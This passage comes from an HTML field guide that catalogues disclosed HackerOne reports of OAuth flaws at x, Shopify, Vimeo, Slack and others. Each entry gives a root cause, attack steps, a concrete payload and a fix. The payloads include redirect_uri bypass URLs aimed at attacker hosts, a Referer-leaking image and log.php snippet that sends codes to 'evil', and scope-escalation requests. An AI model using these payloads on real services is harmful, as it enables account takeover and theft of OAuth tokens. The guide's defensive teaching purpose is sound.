+<div class="spec-foot"><span class="src">↗ <a href="https://hackerone.com/reports/134757" target="_blank" rel="noopener">hackerone.com/reports/134757</a></span><a class="src" href="#report-134757" style="color:var(--faint)">#</a><a class="labchip" href="https://portswigger.net/web-security/oauth" target="_blank" rel="noopener">⚑ Lab</a></div></article>
+<article class="spec hidden" id="report-108113" style="--sv:var(--sev-none)" data-sev="0" data-votes="48" data-bounty="1">
+<div class="spec-eyebrow">Real-world example</div>
+<div class="spec-top"><h3>OAuth callback_url host-validation bypass via non-ASCII authority char</h3><span class="fieldmark">◆ Info</span></div>
+<div class="catalog">Specimen <b>#108113</b> · x · awarded · 48 votes · resolved</div>
+<div class="taxo"><span>Program <b>x</b></span><span>Surface <b>web</b></span><span>Chain <b>callback validation bypass -&gt; OAuth credential to attacke</b></span><span>Tag <b>oauth</b></span><span>Tag <b>account-takeover</b></span></div>
+<h4>Root cause</h4><p style="margin:0">Validator parses callback_url and matches only the hostname (so https://x@registered.tld passes), but when the URL is later written to the Location header a non-ASCII byte is converted to ? AFTER validation, turning the attacker host into the real authority.</p>
+<h4>Method</h4><ol><li>Confirm host-only validation allows userinfo: callback_url=https://anything@registered.tld</li><li>Insert a non-ASCII byte after the attacker host in the authority: attacker.com%ff@registered.tld</li><li>On output %ff -&gt; ? so URL becomes attacker.com?...@registered.tld: attacker.com is now the host, receives victim OAuth credentials</li></ol>
+<div class="pre">https://www.digits.com/login?consumer_key=KEY&amp;host=https%3A%2F%2Fwww.digits.com&amp;callback_url=https://innerht.ml%FF@www.periscope.tv</div>
+<p class="insight"><b>Insight —</b> Parser-vs-serializer differential: validate on a normalized parse, exploit on the raw output. Try non-ASCII / control bytes (%ff, %00, %0d, %E3%80%82) in the authority when a host allowlist is enforced but the value is later reflected into a header/redirect. Same root class powered GHES OAuth redirect_uri regex bypass (CVE-2026-4296).</p>
+<div class="spec-foot"><span class="src">↗ <a href="https://hackerone.com/reports/108113" target="_blank" rel="noopener">hackerone.com/reports/108113</a></span><a class="src" href="#report-108113" style="color:var(--faint)">#</a><a class="labchip" href="https://portswigger.net/web-security/oauth" target="_blank" rel="noopener">⚑ Lab</a></div></article>
+<article class="spec hidden" id="report-143482" style="--sv:var(--sev-none)" data-sev="0" data-votes="42" data-bounty="1">
+<div class="spec-eyebrow">Real-world example</div>
+<div class="spec-top"><h3>Google OAuth SSO accepts any Google account (hd hosted-domain not validated)</h3><span class="fieldmark">◆ Info</span></div>
+<div class="catalog">Specimen <b>#143482</b> · shopify · awarded · 42 votes · resolved</div>
+<div class="taxo"><span>Program <b>shopify</b></span><span>Surface <b>web</b></span><span>Tag <b>oauth</b></span></div>
+<h4>Root cause</h4><p style="margin:0">An internal app gated by 'Sign in with Google' assumed Google login implies a company account, but never validated the hd (hosted domain) claim. Any Google account (personal gmail included) satisfied the check, granting outsiders access to the employee-only monitoring server.</p>
+<h4>Method</h4><ol><li>Find an internal/staff tool using Google OAuth as the only gate.</li><li>Log in with an arbitrary personal Google account.</li><li>If access is granted, the app is not enforcing hd == company-domain.</li></ol>
+<div class="pre"># The fix is to require the hosted-domain claim, e.g. append &amp;hd=company.com to the auth request
+# AND server-side verify id_token.hd == "shopify.com" (and email_verified) before granting access.</div>
+<p class="insight"><b>Insight —</b> 'Sign in with Google/Microsoft' on internal apps is only as strong as its domain check. Always test with an external/personal account; if it works, the app trusts 'a valid Google login' rather than 'a valid COMPANY login' (missing hd validation).</p>
+<div class="spec-foot"><span class="src">↗ <a href="https://hackerone.com/reports/143482" target="_blank" rel="noopener">hackerone.com/reports/143482</a></span><a class="src" href="#report-143482" style="color:var(--faint)">#</a><a class="labchip" href="https://portswigger.net/web-security/oauth" target="_blank" rel="noopener">⚑ Lab</a></div></article>
+<article class="spec hidden" id="report-136582" style="--sv:var(--sev-none)" data-sev="0" data-votes="32" data-bounty="1">
+<div class="spec-eyebrow">Real-world example</div>
+<div class="spec-top"><h3>Cross-site Flashing via permissive crossdomain.xml steals OAuth token</h3><span class="fieldmark">◆ Info</span></div>
+<div class="catalog">Specimen <b>#136582</b> · vimeo · awarded · 32 votes · resolved</div>
+<div class="taxo"><span>Program <b>vimeo</b></span><span>Surface <b>web</b></span><span>Chain <b>Cross-site Flashing read of /oauth/authorize -&gt; OAuth tok</b></span><span>Tag <b>oauth</b></span><span>Tag <b>account-takeover</b></span></div>
+<h4>Root cause</h4><p style="margin:0">api.vimeo.com/oauth/crossdomain.xml allows allow-access-from domain='*', and Flash policy files apply to child directories; calling Security.loadPolicyFile on it lets an attacker SWF read /oauth/authorize (which contains the auth token), enabling silent app authorization.</p>
+<h4>Method</h4><ol><li>Attacker SWF calls Security.loadPolicyFile('https://api.vimeo.com/oauth/crossdomain.xml')</li><li>Load https://api.vimeo.com/oauth/authorize cross-domain (now permitted, child dir)</li><li>Read the OAuth token from the response</li><li>Complete the authorization flow -&gt; attacker app added to victim account without consent</li></ol>
+<div class="pre">Security.loadPolicyFile("https://api.vimeo.com/oauth/crossdomain.xml");
+// then read https://api.vimeo.com/oauth/authorize?... to extract the token</div>
+<p class="insight"><b>Insight —</b> A wildcard crossdomain.xml at a parent directory exposes all child paths to cross-site Flash reads. Sensitive endpoints (OAuth authorize) must live where no permissive policy file sits above them. Move authorize to a path/subdomain with no wildcard policy.</p>
+<div class="spec-foot"><span class="src">↗ <a href="https://hackerone.com/reports/136582" target="_blank" rel="noopener">hackerone.com/reports/136582</a></span><a class="src" href="#report-136582" style="color:var(--faint)">#</a><a class="labchip" href="https://portswigger.net/web-security/oauth" target="_blank" rel="noopener">⚑ Lab: token</a></div></article>
+<article class="spec hidden" id="report-211477" style="--sv:var(--sev-none)" data-sev="0" data-votes="26" data-bounty="1">
+<div class="spec-eyebrow">Real-world example</div>
+<div class="spec-top"><h3>OAuth code theft via stored image URL + Referer leak + loose redirect_uri</h3><span class="fieldmark">◆ Info</span></div>
+<div class="catalog">Specimen <b>#211477</b> · shopify · awarded · 26 votes · resolved</div>
+<div class="taxo"><span>Program <b>shopify</b></span><span>Surface <b>web</b></span><span>Chain <b>settable image URL -&gt; login CSRF -&gt; loose redirect_uri</b></span><span>Tag <b>oauth</b></span><span>Tag <b>account-takeover</b></span></div>
+<h4>Root cause</h4><p style="margin:0">Chaining a self-settable product-image URL (SSRF-ish outbound fetch to attacker), a permissive facebook redirect_uri whitelist (www.kitcrm.com/*), and login CSRF causes the FB ?code= landing page to load the attacker image, leaking the code in the Referer header.</p>
+<h4>Method</h4><ol><li>Set your product image URL to attacker log endpoint</li><li>CSRF-login the victim into attacker store then into kitcrm</li><li>Open the FB oauth dialog with redirect_uri to a kitcrm page that renders your image</li><li>Victim lands on ...?code=&lt;fb_code&gt;; the image request carries that URL in Referer to attacker</li></ol>
+<div class="pre">&lt;img src=https://evil/log.php&gt;  // on the code-bearing page
+log.php: $t=substr($_SERVER['HTTP_REFERER'],strpos(...,'=')+1);</div>
+<p class="insight"><b>Insight —</b> Any page that both renders attacker-controlled remote content AND holds a secret in its URL leaks that secret via Referer; combine with loose redirect_uri to route the secret there.</p>
+<div class="spec-foot"><span class="src">↗ <a href="https://hackerone.com/reports/211477" target="_blank" rel="noopener">hackerone.com/reports/211477</a></span><a class="src" href="#report-211477" style="color:var(--faint)">#</a><a class="labchip" href="https://portswigger.net/web-security/oauth" target="_blank" rel="noopener">⚑ Lab: code</a></div></article>
+<article class="spec hidden" id="report-166942" style="--sv:var(--sev-none)" data-sev="0" data-votes="13" data-bounty="1">
+<div class="spec-eyebrow">Real-world example</div>
+<div class="spec-top"><h3>OAuth token leak via lax callback_url + referer/chaining</h3><span class="fieldmark">◆ Info</span></div>
+<div class="catalog">Specimen <b>#166942</b> · x · awarded · 13 votes · resolved</div>
+<div class="taxo"><span>Program <b>x</b></span><span>Surface <b>web</b></span><span>Chain <b>lax callback_url -&gt; token in URL on trusted page -&gt; Re</b></span><span>Tag <b>oauth</b></span><span>Tag <b>account-takeover</b></span></div>
+<h4>Root cause</h4><p style="margin:0">The OAuth authorize endpoint validates only the host of callback_url (any subdomain/path of the trusted host accepted). Redirecting to an attacker-influenced path on the trusted host (e.g. a page containing an attacker link) leaks the authorization token via the Referer header, and nested callback_url values leak the token cross-origin.</p>
+<h4>Method</h4><ol><li>Point callback_url at a trusted-host page that renders an attacker-controlled outbound link/resource</li><li>Complete authorization; token lands in URL on the trusted page</li><li>Victim clicks/loads the attacker link; token leaks in Referer</li><li>Alternatively chain two authorize calls so the outer callback is the attacker origin</li></ol>
+<div class="pre">https://www.digits.com/login?consumer_key=KEY&amp;callback_url=https://fabric.io/&lt;attacker-injected-issue-page&gt;&amp;host=https://fabric.io
+
+# chained:
+https://www.digits.com/login?consumer_key=K1&amp;host=http://www.digits.com&amp;callback_url=https%3A%2F%2Fwww.digits.com%2Flogin%3Fconsumer_key%3DK2%26host%3Dhttps%3A%2F%2Fattacker%2F%26callback_url%3Dhttps%3A%2F%2Fattacker%2F</div>
+<p class="insight"><b>Insight —</b> For OAuth redirect_uri/callback validation, test host-only validation: attacker-controlled subdomain or path on the trusted host, open-content pages that render your link (token leaks via Referer), and recursive callback chaining to bounce the token to your origin. Host allow-listing without full-URL + path pinning is exploitable.</p>
+<div class="spec-foot"><span class="src">↗ <a href="https://hackerone.com/reports/166942" target="_blank" rel="noopener">hackerone.com/reports/166942</a></span><a class="src" href="#report-166942" style="color:var(--faint)">#</a><a class="labchip" href="https://portswigger.net/web-security/oauth" target="_blank" rel="noopener">⚑ Lab: token</a></div></article>
+<article class="spec hidden" id="report-2575" style="--sv:var(--sev-none)" data-sev="0" data-votes="10" data-bounty="1">
+<div class="spec-eyebrow">Real-world example</div>
+<div class="spec-top"><h3>OAuth redirect_uri validation bypass via domain suffix/subdomain</h3><span class="fieldmark">◆ Info</span></div>
+<div class="catalog">Specimen <b>#2575</b> · slack · awarded · 10 votes · resolved</div>
+<div class="taxo"><span>Program <b>slack</b></span><span>Surface <b>web</b></span><span>Chain <b>redirect_uri bypass -&gt; OAuth code/token exfiltration -&gt</b></span><span>Tag <b>oauth</b></span><span>Tag <b>open-redirect</b></span></div>
+<h4>Root cause</h4><p style="margin:0">The OAuth authorize endpoint validates redirect_uri by loose prefix/substring matching against the registered value (e.g. www.google.com). It accepts www.google.com.mx (suffix) and www.google.com.attacker.com (attacker-controlled parent domain), so the authorization code/token is redirected to an attacker host.</p>
+<h4>Method</h4><ol><li>Register an OAuth app with redirect_uri = http://www.google.com</li><li>Request authorization with redirect_uri = http://www.google.com.attacker.com (or www.google.com.mx)</li><li>Server accepts the suffix/subdomain variant</li><li>Victim's code/token is delivered to the attacker-controlled domain</li></ol>
+<div class="pre">https://slack.com/oauth/authorize?client_id=&lt;id&gt;&amp;redirect_uri=http://www.google.com.attacker.com</div>
+<p class="insight"><b>Insight —</b> Test redirect_uri validation with: registered.com.attacker.com, registered.com.evil, registered.com@attacker.com, registered.com/../, and registered.com.&lt;tld&gt;. Any acceptance of a value where the registered host is only a prefix/substring (not an exact origin match) leaks the OAuth code -&gt; account takeover. The fix is exact host + path matching.</p>
+<div class="spec-foot"><span class="src">↗ <a href="https://hackerone.com/reports/2575" target="_blank" rel="noopener">hackerone.com/reports/2575</a></span><a class="src" href="#report-2575" style="color:var(--faint)">#</a><a class="labchip" href="https://portswigger.net/web-security/oauth" target="_blank" rel="noopener">⚑ Lab: code</a></div></article>
+<article class="spec hidden" id="report-57603" style="--sv:var(--sev-none)" data-sev="0" data-votes="8" data-bounty="1">
+<div class="spec-eyebrow">Real-world example</div>
+<div class="spec-top"><h3>OAuth2 authorization code not revoked on access revocation</h3><span class="fieldmark">◆ Info</span></div>
+<div class="catalog">Specimen <b>#57603</b> · vimeo · awarded · 8 votes · resolved</div>
+<div class="taxo"><span>Program <b>vimeo</b></span><span>Surface <b>api</b></span><span>Chain <b>pre-harvest auth code -&gt; user revokes app -&gt; redeem co</b></span><span>Tag <b>oauth</b></span><span>Tag <b>account-takeover</b></span></div>
+<h4>Root cause</h4><p style="margin:0">When a user revokes a third-party app, the API invalidates issued access_tokens but not outstanding authorization codes; a pre-harvested code can still be exchanged for a fresh, valid access_token after revocation.</p>
+<h4>Method</h4><ol><li>Authorize the app and capture the authorization code from the callback</li><li>Exchange it for an access_token (works)</li><li>Trigger the flow again and capture/save a second, unused code</li><li>Revoke the app in account settings - the access_token now 401s</li><li>Exchange the saved code -&gt; new valid access_token, access restored</li></ol>
+<div class="pre"># harvest a second code before revoking:
+https://api.TARGET/oauth/authorize?response_type=code&amp;client_id=...&amp;redirect_uri=https://avuln.com/callback&amp;scope=public&amp;state=...
+# after user disconnects the app:
+./getAccessToken.sh &lt;saved_unused_code&gt;  -&gt; {"access_token":"..."}</div>
+<p class="insight"><b>Insight —</b> Revocation must invalidate the ENTIRE grant: access_tokens, refresh_tokens AND unused authorization codes. Test by stockpiling a code (optionally auto-issued via an &lt;img&gt; to the authorize URL with approval_prompt=auto), revoking, then redeeming it. A surviving code defeats the user's ability to cut off a malicious app.</p>
+<div class="spec-foot"><span class="src">↗ <a href="https://hackerone.com/reports/57603" target="_blank" rel="noopener">hackerone.com/reports/57603</a></span><a class="src" href="#report-57603" style="color:var(--faint)">#</a><a class="labchip" href="https://portswigger.net/web-security/oauth" target="_blank" rel="noopener">⚑ Lab: code</a></div></article>
+<article class="spec hidden" id="report-2559" style="--sv:var(--sev-none)" data-sev="0" data-votes="8" data-bounty="1">
+<div class="spec-eyebrow">Real-world example</div>
+<div class="spec-top"><h3>OAuth redirect_uri validation bypass via path traversal</h3><span class="fieldmark">◆ Info</span></div>
+<div class="catalog">Specimen <b>#2559</b> · slack · awarded · 8 votes · resolved</div>
+<div class="taxo"><span>Program <b>slack</b></span><span>Surface <b>web</b></span><span>Chain <b>redirect_uri bypass -&gt; steal authorization code -&gt; exc</b></span><span>Tag <b>oauth</b></span><span>Tag <b>account-takeover</b></span></div>
+<h4>Root cause</h4><p style="margin:0">The OAuth provider only prefix/substring-validates redirect_uri, so appending ../../redirect_url=EVIL escapes the registered callback path and the authorization code is delivered to an attacker-controlled URL.</p>
+<h4>Method</h4><ol><li>Start Login-with-&lt;provider&gt; for an app that uses the provider's OAuth</li><li>Modify redirect_uri to traverse out of the allowed path to an attacker endpoint</li><li>Provider appends ?code=... to the attacker URL; capture code and exchange for a session</li></ol>
+<div class="pre">https://provider/oauth/authorize?client_id=...&amp;scope=read,post&amp;redirect_uri=https://GIVENSITE/../../redirect_url=https://EVIL/a.php%2Fcomplete
+-&gt; redirect: http://GIVENSITE/redirect_url=https:/EVIL/a.php/complete?code=AQC...</div>
+<p class="insight"><b>Insight —</b> Test redirect_uri for loose matching: path traversal (../), extra path segments, subdomains, @, //, and open-redirects on the allowed host. Any registered-host open redirect turns a strict-looking OAuth into code theft -&gt; ATO.</p>
+<div class="spec-foot"><span class="src">↗ <a href="https://hackerone.com/reports/2559" target="_blank" rel="noopener">hackerone.com/reports/2559</a></span><a class="src" href="#report-2559" style="color:var(--faint)">#</a><a class="labchip" href="https://portswigger.net/web-security/oauth" target="_blank" rel="noopener">⚑ Lab: code</a></div></article>
+<article class="spec hidden" id="report-26962" style="--sv:var(--sev-none)" data-sev="0" data-votes="6" data-bounty="3000">
+<div class="spec-eyebrow">Real-world example</div>
+<div class="spec-top"><h3>OAuth RFC6749 open redirect via registered attacker redirect_uri + error response</h3><span class="fieldmark">◆ Info</span></div>
+<div class="catalog">Specimen <b>#26962</b> · ibb · USD 3000 · 6 votes · resolved</div>
+<div class="taxo"><span>Program <b>ibb</b></span><span>Surface <b>web</b></span><span>Chain <b>OAuth error redirect -&gt; open redirect -&gt; phishing / to</b></span><span>Tag <b>oauth</b></span></div>
+<h4>Root cause</h4><p style="margin:0">RFC6749 says on non-redirect-URI errors the AS appends error params to the redirect_uri and redirects. An attacker registers a client with an attacker-owned redirect_uri, then triggers an error (e.g. invalid scope) so the AS becomes an open redirector to attacker.com without a consent screen.</p>
+<h4>Method</h4><ol><li>Register (or find a client) whose redirect_uri you control (attacker.com).</li><li>Craft an authorize URL that intentionally fails on a non-redirect-URI reason (invalid scope).</li><li>The spec-compliant AS redirects the victim to attacker.com carrying error params, acting as an open redirect.</li></ol>
+<div class="pre">http://victim.com/authorize?response_type=code&amp;client_id=VALID_CLIENT&amp;scope=WRONG_SCOPE&amp;redirect_uri=http://attacker.com</div>
+<p class="insight"><b>Insight —</b> OAuth authorization servers are open redirectors by design when they redirect on error to a registered redirect_uri. Test invalid scope / invalid response_type against any /authorize endpoint; the fix is HTTP 400 on error or always show consent.</p>
+<div class="spec-foot"><span class="src">↗ <a href="https://hackerone.com/reports/26962" target="_blank" rel="noopener">hackerone.com/reports/26962</a></span><a class="src" href="#report-26962" style="color:var(--faint)">#</a><a class="labchip" href="https://portswigger.net/web-security/oauth" target="_blank" rel="noopener">⚑ Lab</a></div></article>
+<article class="spec hidden" id="report-98499" style="--sv:var(--sev-none)" data-sev="0" data-votes="3" data-bounty="500">
+<div class="spec-eyebrow">Real-world example</div>
+<div class="spec-top"><h3>OAuth app requests undocumented/privileged scopes with no server-side allowlist</h3><span class="fieldmark">◆ Info</span></div>
+<div class="catalog">Specimen <b>#98499</b> · shopify · USD 500 · 3 votes · resolved</div>
+<div class="taxo"><span>Program <b>shopify</b></span><span>Surface <b>api</b></span><span>Chain <b>over-scoped token → undocumented beta API (add/remove/modify</b></span><span>Tag <b>oauth</b></span></div>
+<h4>Root cause</h4><p style="margin:0">The OAuth authorize endpoint honors any scope string in the request, including undocumented/privileged beta scopes (read_channels/write_channels) that should require extra vendor approval; the granted access_token then reaches those APIs.</p>
+<h4>Method</h4><ol><li>Build an authorize URL with the documented scopes plus guessed/undocumented ones</li><li>Complete consent and exchange for an access_token</li><li>Use the token against the privileged/beta endpoints (e.g. /admin/channels)</li></ol>
+<div class="pre">https://victim.myshopify.com/admin/oauth/authorize?client_id=APP&amp;scope=read_channels,write_channels,write_scripts,...&amp;redirect_uri=https://attacker/&amp;state=123&amp;shop=victim</div>
+<p class="insight"><b>Insight —</b> Test OAuth scope handling by requesting undocumented / higher-privilege scopes in the authorize call. If the server does not restrict scopes to those provisioned for the app, you get access it should never grant. Enumerate scope names from API docs and error responses.</p>
+<div class="spec-foot"><span class="src">↗ <a href="https://hackerone.com/reports/98499" target="_blank" rel="noopener">hackerone.com/reports/98499</a></span><a class="src" href="#report-98499" style="color:var(--faint)">#</a><a class="labchip" href="https://portswigger.net/web-security/oauth" target="_blank" rel="noopener">⚑ Lab: token</a></div></article></div>
+    <button class="loadmore" id="loadmore">Load more specimens (38 of 62 remaining)</button>
+    <h2 class="sec" id="refs"><span class="tick">§</span>References &amp; practice</h2>
+<ol class="refs">
+<li>PortSwigger Web Security Academy — <a href="https://portswigger.net/web-security/oauth" target="_blank" rel="noopener">OAuth labs</a> (hands-on practice).</li>
+<li>All 62 disclosed reports for this class are catalogued as specimens above.</li>
+<li>See also: <a href="../chains.html">exploit chains</a> · <a href="../payloads.html">payload libraries</a> · <a href="../methodology/recon.html">methodology</a>.</li>
+</ol>
+  </main>
+  <nav class="toc" aria-label="In this entry"><h5>In this entry</h5><a href="#basic-information">Basic information</a><a href="#methodology">Methodology</a><a href="#credential-theft-vectors">Credential-theft vectors</a><a href="#redirect-uri-validation-bypass" style="padding-left:24px">↳ redirect_uri validation bypass</a><a href="#response-type-response-mode-manipulation" style="padding-left:24px">↳ response_type / response_mode manipulation</a><a href="#postmessage-relay-bridge-pages" style="padding-left:24px">↳ postMessage relay &amp; bridge pages</a><a href="#csrf-on-the-authorize-endpoint-forced-grant-consent-skip" style="padding-left:24px">↳ CSRF on the authorize endpoint (forced grant / consent skip)</a><a href="#token-endpoint-replay-broken-expiry" style="padding-left:24px">↳ Token endpoint: replay &amp; broken expiry</a><a href="#social-login-token-confusion-audience-not-verified" style="padding-left:24px">↳ Social-login token confusion (audience not verified)</a><a href="#state-login-csrf-account-linking" style="padding-left:24px">↳ state / login-CSRF &amp; account linking</a><a href="#bypasses">Bypasses</a><a href="#escalation-impact">Escalation &amp; impact</a><a href="#prevention">Prevention</a><a href="#tools">Tools</a><a href="#specimens">Specimens (62)</a><a href="#refs">References</a><h5 style="margin-top:22px">Practice</h5><a href="https://portswigger.net/web-security/oauth" target="_blank" rel="noopener">⚑ PortSwigger: OAuth</a></nav>
+</div>
+<footer class="foot"><img class="seal" src="/favicon.jpg" alt="Logo"><span>The Hacktivity Field Guide — distilled from disclosed HackerOne reports for defensive, educational research. Every specimen cites <code>hackerone.com/reports/&lt;id&gt;</code>.</span></footer>
+<script src="../assets/app.js"></script></body></html>
